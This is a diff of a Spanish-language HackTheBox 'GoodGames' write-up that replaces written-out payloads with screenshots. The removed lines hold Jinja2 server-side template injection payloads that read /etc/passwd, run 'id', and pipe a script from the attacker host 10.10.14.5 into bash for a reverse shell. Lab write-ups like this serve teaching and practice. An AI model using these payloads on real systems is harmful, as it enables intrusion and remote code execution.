@@ -244,15 +244,11 @@ Y puedo ver la respuesta en el propio panel web.
 
 Estuve buscando información al respecto y encontré varios payloads que podrían servirme, asique probé uno de ellos para intentar leer el archivo passwd.
 
-```bash
-<{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}>
-```
+![](/assets/images/HTB/Goodgames-HackTheBox/ssti3.webp)
 
 A continuación probé un payload para intentar ejecutar comandos
 
-```bash
-<{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}>
-```
+![](/assets/images/HTB/Goodgames-HackTheBox/ssti4.webp)
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/ssti2.webp)
 
@@ -260,9 +256,7 @@ Y funciona, puedo ejecutar comandos en el sistema, por lo que creo una reverse s
 
 ![](/assets/images/HTB/Goodgames-HackTheBox/shell.webp)
 
-```bash
-<{{request.application.__globals__.__builtins__.__import__('os').popen('curl 10.10.14.5:8081/rev.sh | bash').read()}}>
-```
+![](/assets/images/HTB/Goodgames-HackTheBox/ssti5.webp)
 
 Y por fin consigo la shell, y parece que soy usuario root directamente... pero no puedo leer la flag del usuario root.
 
